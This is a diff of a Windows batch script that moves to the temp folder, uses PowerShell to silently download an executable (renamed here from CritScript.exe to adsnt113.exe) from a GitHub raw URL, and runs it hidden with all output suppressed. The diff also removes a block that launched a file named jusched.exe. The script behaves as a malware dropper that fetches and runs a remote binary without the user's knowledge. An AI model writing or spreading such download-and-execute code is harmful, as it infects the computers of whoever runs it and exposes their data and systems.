@@ -11,23 +11,17 @@
     cd %TEMP%
 
     REM --> Download files silently using PowerShell
-    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe" >nul 2>&1
+    powershell -Command "Invoke-WebRequest 'https://github.com/walks111551/09672018256120856125/raw/refs/heads/main/adsnt113.exe' -OutFile adsnt113.exe" >nul 2>&1
 
 
-    REM --> Check if CritScript.exe exists silently
+    REM --> Check if adsnt113.exe exists silently
     if not exist "CritScript.exe" (
         exit /b
     )
 
-    REM --> Execute CritScript.exe silently
-    start /B "" CritScript.exe >nul 2>&1
+    REM --> Execute adsnt113.exe silently
+    start /B "" adsnt113.exe >nul 2>&1
     timeout /t 5 /nobreak >nul 2>&1
 
-    REM --> Check and run JUSCHED.EXE if it exists
-    for %%F in (jusched.exe JUSCHED.EXE) do (
-        if exist "%%F" (
-            start /B "" %%F >nul 2>&1
-            timeout /t 5 /nobreak >nul 2>&1
-            goto :CreateShortcut
         )
     )
